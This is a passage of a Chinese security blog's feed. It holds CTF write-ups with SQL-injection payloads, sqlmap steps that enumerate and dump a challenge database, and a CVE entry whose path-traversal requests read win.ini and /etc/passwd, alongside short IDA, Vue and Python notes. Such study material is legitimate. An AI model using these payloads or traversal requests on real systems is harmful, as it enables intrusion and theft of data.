be474a9f54df5e2174bc806196dcaf927a92b37a74452095645faca8321231fc342d112c90873d3eaaa68c833fa65b77ee1637559f632d6be5496b686bb656ed9493f09ccb07f8e863aa567045a9fd6d2fd448cba622c53dab0d5aee830f4bd9c0e26c1934dc03c0f1a5ae15e4a5d99f8d896cf0f458486f7b3858f70c9c2195b70eed67c395daa675c559943f6b22dffbc2e09c4dc0b1d466c82c9ff4b66e3444e38eb656936e7df997a9efdd09c2196d5c85ec794ca44a56389af9f8a784ec44857929ba0b1aefb3bc0bd8ebf8fcbe66ef77972a222aac9ed5fffb5ede5752e304552d04116fae60e9897f9b75ab244e1ccf1ba586ba3b8dbf30f22cc3c275b881a5f8fd87845d268dc7be7b40c8d023b10c2a85adeeb3cb724747a8116c495a765441a3bcc302b7023b58adc2a9f9332bc3155d2c0997ca78d06e1183e5a0f49d06da7b8d71d3c6d83d7759f34cc570c022deeac45da534ef82aa21ede79efbeb007221ac02ece2d712bd92d758804faef5804b6374b2c6d7a5fcc11fda0aafca1f038ec74786d9fbf3bf40071fab98745dde6d3cab5ecef0e4275b0de44c11c4497b9df3e1ebaf044c59a674e0ec52ec6c5fca458a26437ea94643afa9210eb50fd64cadd391a74828fda3155c57e15ff2fa6088ff0a1fa86607358de576c05a4873fd56553f7fb0a0b888f61c7d5bb58caab1ddfd9ac5e713f6f74a669b66ee140d74f28f97bc00b7be7f2f3ad55064ed22277114899116e2ee8aecdcda5b3c6f777b7f268af58b7b05725ec957f381adeddcd6714b1b48bb3b1729cdffb44bad2c44ffa1b8d7a9cde08c182e5c06dcf6fdcc26c44fcb168732377d39d1fe10898b63b560cae505f597b783a6039786930461b2af4523c0fa7df8dbdd96d8915625e9b8b942f449a960ea7b484fcac1a680fe4773c9c9ca1f2d6368e6395ddefaaee481d870bbe3c3306b72fcb61bf9b6965c96b11e1ab23e87d21c2a6858e5ca292fe7a6b10ded80ef0d76403f64441ce3763f6002fde8c484509b488810740d8ebb241f74e179f9de2ccaf5be22199739f2b04c3bcb352b97ceff3943fe3f214ef1ee59a51c0c9ef0d82c2a3034d761a76c4b03915a188b03a1ad8fd28fb8ed3188a3b7a82511b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re入门</title>
      <link href="/2024/11/13/buuoj-easy-re/"/>
      <url>/2024/11/13/buuoj-easy-re/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="IDA-Pro是一款逆向工程工具，可以用来分析二进制文件，它可以将二进制文件转换成汇编代码，方便我们进行逆向分析。IDA-Pro是一款非常强大的逆向工程工具，但是它的学习曲线也比较陡峭，所以我们需要一些基础的知识来帮助我们学习IDA-Pro。"><a href="#IDA-Pro是一款逆向工程工具，可以用来分析二进制文件，它可以将二进制文件转换成汇编代码，方便我们进行逆向分析。IDA-Pro是一款非常强大的逆向工程工具，但是它的学习曲线也比较陡峭，所以我们需要一些基础的知识来帮助我们学习IDA-Pro。" class="headerlink" title="IDA Pro是一款逆向工程工具，可以用来分析二进制文件，它可以将二进制文件转换成汇编代码，方便我们进行逆向分析。IDA Pro是一款非常强大的逆向工程工具，但是它的学习曲线也比较陡峭，所以我们需要一些基础的知识来帮助我们学习IDA Pro。"></a>IDA Pro是一款逆向工程工具，可以用来分析二进制文件，它可以将二进制文件转换成汇编代码，方便我们进行逆向分析。IDA Pro是一款非常强大的逆向工程工具，但是它的学习曲线也比较陡峭，所以我们需要一些基础的知识来帮助我们学习IDA Pro。</h1><p>IDA 分为IDA 32 ,IDA 64,IDA 64是64位的，IDA 32是32位的，我们一般使用IDA 64来分析64位的二进制文件，使用IDA 32来分析32位的二进制文件。</p><p>IDA Pro的界面分为几个部分，分别是：</p><ol><li>菜单栏</li><li>工具栏</li><li>函数列表</li><li>反汇编窗口</li><li>数据窗口</li><li>交叉引用窗口</li><li>寄存器窗口</li><li>栈窗口</li><li>伪代码窗口</li><li>导入导出窗口</li></ol><h3 id="先看IDA-View界面"><a href="#先看IDA-View界面" class="headerlink" title="先看IDA View界面"></a>先看IDA View界面</h3><p><a href="/../assets/img/image-7.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-7.png" alt="alt text"></a></p><h2 id="如何通过反汇编转成C语言代码"><a href="#如何通过反汇编转成C语言代码" class="headerlink" title="如何通过反汇编转成C语言代码"></a>如何通过反汇编转成C语言代码</h2><p>我们可以通过IDA Pro将反汇编代码转换成C语言代码，这样我们就可以更加方便的进行逆向分析。我们可以通过以下步骤来将反汇编代码转换成C语言代码：</p><ol><li>打开二进制文件</li><li>反汇编二进制文件</li><li>选择要转换的函数</li></ol><p><a href="/../assets/img/image-8.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-8.png" alt="alt text"></a></p><p><strong>跳转变量</strong></p><p><a href="/../assets/img/image-9.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-9.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> #IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow_web10</title>
      <link href="/2024/11/13/2024-07-26-ctfshow-web10/"/>
      <url>/2024/11/13/2024-07-26-ctfshow-web10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="玩玩web"><a href="#玩玩web" class="headerlink" title="玩玩web"></a>玩玩web</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ol><li><p>行内注释</p></li><li><p>虚拟表链接 密码为空</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user_name = <span class="string">&quot;&quot;&quot;&#x27;username=&#x27; or 1=1 group by password with rollup#&quot;&quot;&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;&quot;&amp;password=&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">parm = user_name + password</span><br><span class="line">new_str = parm.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p><a href="/../assets/img/image-5.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-5.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web9</title>
      <link href="/2024/11/13/2024-07-25-ctfshow-web9/"/>
      <url>/2024/11/13/2024-07-25-ctfshow-web9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>没事打打CTF 也是一种乐趣，这里记录一下一些Web方向的题目，以及解题思路。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于函数md5(string,raw) 第二个参数有以下可选项： TRUE - 原始 16 字符二进制格式 FALSE - 默认。32 字符十六进制数 所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username &#x3D;’admin’ and password &#x3D;‘ ’or ‘xxxxx’ 成功登陆 这里给出两个符合的字符串 ffifdyop 129581926211651571912466741651878684928 但题目有长度限制，所以输入ffifdyop即可获取flag</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WebSec </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj-强网杯-2019</title>
      <link href="/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/"/>
      <url>/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="/../assets/img/image-4.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-4.png" alt="alt text"></a></p><h3 id="有备份？"><a href="#有备份？" class="headerlink" title="有备份？"></a>有备份？</h3><p>敏感路径泄露</p><p><a href="/../assets/img/image-6.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-6.png" alt="alt text"></a></p><p>代码居多，应该找到函数的入口，或者看看有没有什么敏感的函数 <code>eval</code></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> buuoj </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web</title>
      <link href="/2024/11/13/2024-07-24-ctfshow-web/"/>
      <url>/2024/11/13/2024-07-24-ctfshow-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>没事打打CTF 也是一种乐趣，这里记录一下一些Web方向的题目，以及解题思路。</p><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><p>在上述命令中，–batch 选项用于自动执行操作而无需手动干预，–level&#x3D;4 选项增加了测试强度，–tamper&#x3D;space2comment 选项用于规避防护机制。</p><p>命令的基本格式和说明如下：<br><code>python .\sqlmap.py -u &lt;目标URL&gt; --batch --level=4 --tamper=space2comment</code><br>对于你的具体需求，命令如下：</p><p><code>python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment</code></p><p>该命令会尝试对 <a href="https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2">https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2</a> 进行 SQL 注入测试，并自动处理测试过程中的问题。</p><p>执行这条命令可能会涉及以下几步：</p><p>识别注入点：确定 URL 参数中是否存在 SQL 注入漏洞。<br>数据库枚举：如果存在漏洞，尝试枚举数据库中的表和列。<br>数据提取：从数据库中提取数据。</p><p>要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：</p><p>要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：</p><ol><li><p><strong>列出所有数据库</strong>：</p><p> <code>python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment --dbs</code></p><p> 这个命令会列出目标数据库服务器上所有可用的数据库。</p></li><li><p><strong>列出某个数据库中的所有表</strong>：</p><p> 假设你从上一步中获取到了数据库的名字，接下来你可以列出该数据库中的所有表。使用以下命令（将 <code>&lt;database_name&gt;</code> 替换为实际的数据库名称）：</p><p> <code>python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D &lt;database_name&gt; --tables</code></p></li><li><p><strong>列出某个表中的所有列</strong>：</p><p> 假设你从上一步中获取到了表的名字，接下来你可以列出该表中的所有列。使用以下命令（将 <code>&lt;table_name&gt;</code> 替换为实际的表名称）：</p><p> <code>python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</code></p></li><li><p><strong>提取某个表中的数据</strong>：</p><p> 如果你需要从表中提取数据，可以使用以下命令（将 <code>&lt;column_name&gt;</code> 替换为实际的列名）：</p><p> <code>python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column_name&gt; --dump</code></p><p> 这个命令会从指定的表和列中提取数据。</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WebSec </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-36991</title>
      <link href="/2024/11/13/2024-07-05-CVE-2024-36991/"/>
      <url>/2024/11/13/2024-07-05-CVE-2024-36991/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="CVE-2024-36991"><a href="#CVE-2024-36991" class="headerlink" title="CVE-2024-36991"></a>CVE-2024-36991</h1><h1 id="CVE-2024-36991-1"><a href="#CVE-2024-36991-1" class="headerlink" title="CVE-2024-36991"></a>CVE-2024-36991</h1><p><a href="/assets/img/cve1.png" title="alt text" class="gallery-item"><img src="/assets/img/cve1.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WebSec </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-28559</title>
      <link href="/2024/11/13/2024-06-23-CVE-2024-28559/"/>
      <url>/2024/11/13/2024-06-23-CVE-2024-28559/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="CVE-28559"><a href="#CVE-28559" class="headerlink" title="CVE-28559"></a>CVE-28559</h1><p>cve-2024-28995</p><p>Windows<br>GET &#x2F;?InternalDir&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&amp;InternalFile&#x3D;win.ini HTTP&#x2F;1.1</p><p>linux<br>GET &#x2F;?InternalDir&#x3D;........\etc&amp;InternalFile&#x3D;passwd HTTP&#x2F;1.1<br>~~</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
          <category> exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyCharm食用指南</title>
      <link href="/2024/11/13/2024-04-16-PycharmCookBook/"/>
      <url>/2024/11/13/2024-04-16-PycharmCookBook/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="PyCharm"><a href="#PyCharm" class="headerlink" title="PyCharm"></a>PyCharm</h1><ol><li><code>shadows build-in name</code><br> 避免使用<code>python</code>内置函数名称</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> JetBrains </category>
          
          <category> PyCharm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> PyCharm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue使用指南</title>
      <link href="/2024/11/13/Vue-Cook/"/>
      <url>/2024/11/13/Vue-Cook/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>Vue.js 是一个流行的 JavaScript 框架，用于构建现代的交互式 Web 应用程序。它提供了一种简单而灵活的方式来创建用户界面，使开发者能够轻松地构建复杂的单页面应用（SPA）和动态网页。Vue.js 的核心库只关注视图层，因此它易于集成到现有项目中，并且可以与其他库和框架（如 React 和 Angular）一起使用。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p><code>npm run dev</code> 启动开发服务器</p><h2 id="基本文件"><a href="#基本文件" class="headerlink" title="基本文件"></a>基本文件</h2><ul><li><code>App.vue</code>：Vue 应用程序的入口文件，包含根组件的挂载点。</li></ul><p>文件如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;&#123;&#123; count &#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;TodoItem/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import TodoItem from &#x27;./components/TodoItem.vue&#x27;</span><br><span class="line">  export default&#123;</span><br><span class="line">    name: &quot;App&quot;,</span><br><span class="line">    components:&#123;TodoItem&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>isinstancce</title>
      <link href="/2024/11/13/2024-03-31-isinstance/"/>
      <url>/2024/11/13/2024-03-31-isinstance/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><code>isinstance</code> 是 Python 编程语言中的一个内置函数，它用于检查一个对象是否是指定类或者是该类所定义的类的实例。</p><p>具体来说，<code>isinstance()</code> 函数接受两个参数：第一个参数是需要检查的对象，第二个参数是一个类或者包含多个类的元组。如果第一个参数是第二个参数指定的类或者是从属于这个类的子类，那么 <code>isinstance()</code> 函数将返回 <code>True</code>，否则返回 <code>False</code>。</p><p>这个函数在面向对象编程中非常有用，尤其是在需要根据对象的类型来执行不同操作或者在处理继承和多态性时。它可以帮助开发者确保对象具有期望的类型，从而避免类型错误和潜在的运行时异常。</p><p>下面是一个简单的使用 <code>isinstance</code> 函数的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Dog 类的实例</span></span><br><span class="line">my_dog = Dog(<span class="string">&quot;Buddy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 isinstance 检查 my_dog 是否是 Dog 类的实例</span></span><br><span class="line">is_dog = <span class="built_in">isinstance</span>(my_dog, Dog)</span><br><span class="line"><span class="built_in">print</span>(is_dog)  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span 